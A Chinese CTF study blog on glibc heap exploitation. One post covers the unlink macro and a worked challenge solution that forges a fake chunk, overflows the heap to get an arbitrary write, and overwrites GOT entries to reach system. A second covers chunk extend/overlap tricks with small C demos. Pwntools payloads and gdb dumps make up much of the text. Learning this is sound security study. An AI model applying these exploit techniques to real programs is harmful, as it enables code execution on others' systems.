<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line">    FD = P-&gt;fd;                                                                      </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<h4 id="关于FD-gt-bk和BK-gt-fd"><a href="#关于FD-gt-bk和BK-gt-fd" class="headerlink" title="关于FD-&gt;bk和BK-&gt;fd"></a>关于FD-&gt;bk和BK-&gt;fd</h4><p>关于这个东西始终有些细节不太确定，所以干脆自己写个程序来确定一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> prev_size;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="keyword">char</span>* fd;</span><br><span class="line">	<span class="keyword">char</span>* bk;</span><br><span class="line">&#125;chunk,*pchunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">size_t</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">size_t</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">	pchunk ptr = p2<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ptr = %p\n&quot;</span>, ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&amp;ptr = %p\n&quot;</span>, &amp;ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ptr-&gt;fd = %p\n&quot;</span>, ptr-&gt;fd);</span><br><span class="line">	pchunk FD = ptr-&gt;fd;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FD = %p\n&quot;</span>,FD);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FD-&gt;bk = %p\n&quot;</span>,FD-&gt;bk);</span><br><span class="line">	pchunk BK = ptr-&gt;bk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;BK = %p\n&quot;</span>,BK);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;BK-&gt;fd = %p\n&quot;</span>,BK-&gt;fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为unlink应用于双向链表，所以我malloc了三块大于fast bin的chunk，然后先后释放。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line">0xa0: 0x602180 —▸ 0x6020c0 —▸ 0x602000 —▸ 0x7ffff7dd1c08 (main_arena+232) ◂— 0x602180</span><br></pre></td></tr></table></figure>

<p>然后让结构体指针ptr指向chunk2的头部，也就是说此时<code>ptr = 0x6020c0</code></p>
<p>首先是<code>ptr-&gt;fd</code>，很简单，一共分成两步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x4006e1 &lt;main+187&gt;    mov    rax, qword ptr [rbp - 0x38]</span><br><span class="line">  0x4006e5 &lt;main+191&gt;    mov    rax, qword ptr [rax + 0x10]</span><br></pre></td></tr></table></figure>

<p>其中<code>[rbp - 0x38] == 0x6020c0 == ptr</code>，<code>[rax + 0x10] == *(ptr + 2) == 0x602000</code></p>
<p>综合起来其实也就一步：<code>*(ptr + 2)</code></p>
<p>那么<code>FD-&gt;bk</code>呢？一共分成两步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x40071d &lt;main+247&gt;    mov    rax, qword ptr [rbp - 0x18]</span><br><span class="line">  0x400721 &lt;main+251&gt;    mov    rax, qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>

<p>其中<code>[rbp - 0x18] == FD == 0x602000</code>，<code>[rax + 0x18] == *(FD + 3) = 0x6020c0</code></p>
<p>综合起来其实还是一步：<code>*(FD + 3)</code></p>
<p>到这里为止其实就可以说明<code>FD-&gt;bk</code>这条指令其实等效于<code>*(*(ptr + 2) + 3)</code>，在这个例子中，<code>ptr == 0x6020c0</code>，那么<code>FD-&gt;bk</code>也就等效于<code>*(*(0x6020c0 + 0x10) + 0x18)</code></p>
<p>同样的道理，<code>BK-&gt;fd</code>等效于<code>*(*(ptr + 3) + 2) == *(*(0x6020c0 + 0x18) + 0x10)</code></p>
<h4 id="用一道题目来讲"><a href="#用一道题目来讲" class="headerlink" title="用一道题目来讲"></a>用一道题目来讲</h4><p>（本题是<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11q4y1E7E2?spm_id_from=333.788.top_right_bar_window_history.content.click">【星盟安全】PWN系列教程 第20节 Unlink</a> 教程里的例题，在libc-2.23环境）</p>
<p>首先是创建堆块的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me a book ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how long: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  result = id;</span><br><span class="line">  <span class="keyword">if</span> ( id &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = id;</span><br><span class="line">    <span class="keyword">if</span> ( id &lt;= <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &lt; <span class="number">0</span> || *(&amp;chunk + id) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;too large!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = id;</span><br><span class="line">        *(&amp;chunk + v3) = <span class="built_in">malloc</span>(size);	<span class="comment">//在这里将堆指针放到了.bss段上</span></span><br><span class="line">        Size[v3] = size;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本题没开PIE，所以知道chunk的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000602300 chunk           dq ?                    ; DATA XREF: init+7C↑o</span><br><span class="line">.bss:0000000000602300                                         ; add+83↑r ...</span><br><span class="line">.bss:0000000000602308                 db    ? ;</span><br></pre></td></tr></table></figure>

<p>然后是一个有堆溢出的edit功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which book to write?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how big?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;chunk + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read_0(*(&amp;chunk + v1), v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>剩下一个正常的free功能函数就不贴了，本题没有show功能函数。</p>
<p>接下来就是重点，也是我卡了好几天才稍微搞懂的一些点：</p>
<ol>
<li><p>在unlink宏中，传进去的P指针：</p>
<p>① 向后合并（向低地址合并）时，传进去的P指针的值实际上是“当前要free掉的chunk的头部 - prev size”（也就是低地址的chunk的头部）（这里还有一点不懂，如果传进去的P指针是低地址的chunk的头部的话，那么P-&gt;fd跟P-&gt;bk是在这期间写进低地址chunk里面的吗）。</p>
<p>② 向前合并（向高地址合并）时，因为当前要free掉的chunk就是低地址chunk，所以传进去的P指针就是当前chunk的头部</p>
</li>
<li><p>向后合并：向低地址合并时就要判断低地址的chunk是否空闲，所以可以直接判断当前chunk的P位是否为0以及是否有prev size，如果判断为空闲，就用unlink合并。</p>
<p>向前合并：因为要判断高地址chunk是否空闲，所以要去查看更高地址的chunk（下下个chunk）的P位以及其是否有prev size，如果判断为空闲，就用unlink合并。找到下下个chunk的方法就是 “当前chunk的头部地址+当前chunk的size+下一个chunk的size”。</p>
</li>
<li><p>绕过<code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</code>的方法</p>
<p>知道了1、2两点之后，我们回到例题</p>
<p>首先申请四块chunk</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<p>在add功能函数中我们知道，从0x602300这个地址开始会保存堆指针，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x0000000001955010	0x0000000001955050</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000001955150	0x0000000001955260</span><br><span class="line">0x602320 &lt;chunk+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>再来看前两个chunk中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x0000000001955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>接下来就是触发unlink的过程：</p>
<ol>
<li><p>在chunk0的数据段中伪造一个chunk，以及用堆溢出修改chunk1的prev size和size</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fd = <span class="number">0x00602300</span>-<span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x00602300</span>-<span class="number">0x10</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">fake_chunk += p64(fd) + p64(bk)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x30</span>) + p64(<span class="number">0x100</span>)	<span class="comment">#将chunk1的prev size改成fake_chunk的大小，以及size的低一bit置零</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,fake_chunk)</span><br></pre></td></tr></table></figure>

<p>修改完之后两个chunk中的数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000031	=&gt;从这里开始属于fake_chunk</span><br><span class="line">0x1955020:	0x00000000006022e8	0x00000000006022f0</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000030	0x0000000000000100</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可以看到这里我们将fake_chunk的fd设置成了<code>&amp;chunk0 - 0x18</code>，bk设置成了<code>&amp;chunk0 - 0x10</code>，接下来我们就讲原因</p>
<p>① 首先我们这里准备的是向后合并，也就是向低地址合并，所以我们修改了chunk1的prev size以及size，我们最后会通过free掉chunk1来触发unlink的向后合并。那么我们如上修改完之后，unlink时传进去的P指针的值是多少呢？答案就是chunk1的头部地址 - prev size，也就是<code>P = 0x1955040 - 0x30 = 0x1955010</code></p>
<p>② 那么我们就知道<code>FD = P-&gt;fd == *(0x1955010 + 0x10) == 0x6022e8</code>，<code>BK = P-&gt;bk == *(0x1955010 + 0x18) == 0x6022f0</code></p>
<p>那么显而易见，<code>FD-&gt;bk == *(0x6022e8 + 0x18) == *(0x602300) == 0x1955010 == P</code>，同时<code>BK-&gt;fd == *(0x6022f0 + 0x10) == *(0x602300) == 0x1955010 == P</code></p>
<p>因为<code>0x602300</code>上面存放的就是<code>P</code>的地址，所以我们就能够通过这样的构造从而来绕过unlink的检测</p>
</li>
<li><p>然后我们free掉chunk1，再来看看两个堆中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000131</span><br><span class="line">0x1955020:	0x00007faf0229bb78	0x00007faf0229bb78</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000030	0x0000000000000100</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可以看到chunk1跟fake_chunk合并了，并且放到了unsorted bin中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x1955010 —▸ 0x7faf0229bb78 (main_arena+88) ◂— 0x1955010</span><br></pre></td></tr></table></figure></li>
</ol>
<p>那么到这里为止我们实现了什么效果呢？我们可以看到在unlink源码中的这一部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>最后unlink会将<code>FD(0x6022e8)</code>写进<code>BK-&gt;fd(0x602300)</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x00000000006022e8	0x0000000000000000</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000001955150	0x0000000001955260</span><br><span class="line">0x602320 &lt;chunk+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>所以到这里为止我们所实现的就是将<code>&amp;P-0x18</code>写进了<code>&amp;P</code>里面，完成了堆指针的修改</p>
<p>然后我们再用edit功能函数编辑chunk0的时候，实际上就是从<code>0x6022e8</code>开始写值，这样我们就能进一步将堆指针修改成任意值，从而完成最后的任意地址写</p>
<p>接下来就是这题剩下的部分了，我们将堆指针修改成如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x0000000000602060	0x0000000000602060</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000000602018	0x0000000001955260</span><br></pre></td></tr></table></figure>

<p>因为本题的got表可改，而且没有show功能，所以我们将free函数的got表改成puts函数，然后free(0)就能将atoi函数的got表泄漏，完成libc的泄漏，最后free改system就行。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/extend-overlopping/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/07/extend-overlopping/" class="post-title-link" itemprop="url">extend_overlopping</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-07 01:17:02" itemprop="dateCreated datePublished" datetime="2022-05-07T01:17:02+08:00">2022-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-10 01:50:13" itemprop="dateModified" datetime="2022-05-10T01:50:13+08:00">2022-05-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
<li><p>程序中存在基于堆的漏洞</p>
</li>
<li><p>该漏洞可以控制 chunk hearder 中的数据</p>
</li>
</ol>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得块重叠之后能利用大chunk修改其包含的小chunk的内容</p>
<p>如果某个chunk中存在字符串指针，函数指针等等，就可以考虑这种利用方式</p>
<p>同时假如被重叠的堆块是free chunk的话，就可以修改其fd/bk指针</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 ptmalloc 中</p>
<p>获取下一chunk（高地址chunk）地址的操作：当前块指针加上size</p>
<p>获取上一chunk（低地址chunk）地址的操作：当前块指针减去prev size</p>
<p>查看当前chunk是否inuse：去查看下一chunk的inuse位</p>
<p>总结：ptmalloc基于chunk header中的数据来判断chunk的使用情况以及前后块的定位</p>
<h3 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h3><p>实现方法：</p>
<p>更改低地址chunk的size位，使该chunk的大小足以覆盖想要修改的数据，free掉该chunk之后再malloc回来，就在原本的位置上得到了一个大chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0x71</span>;		<span class="comment">//修改chunk1的size位</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对-inuse-的-smallbin-进行-extend"><a href="#对-inuse-的-smallbin-进行-extend" class="headerlink" title="对 inuse 的 smallbin 进行 extend"></a>对 inuse 的 smallbin 进行 extend</h3><p>其实这个跟上面的一样，只是当我们修改的size大于fastbin范围的时候有一点需要注意，就是我们free掉的这个大chunk不能紧贴top chunk，否则就会直接跟其合并。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);	<span class="comment">//垫一个chunk防止chunk1与top chunk合并</span></span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0xd1</span>;		<span class="comment">//修改chunk1的size位(0x90+0x40)</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0xc0</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h3><p>这个跟上面的也一样，只是其是在chunk1被正常free掉之后再去修改其size位，这样修改就不需要垫一个chunk，因为是free掉之后再改的size</p>
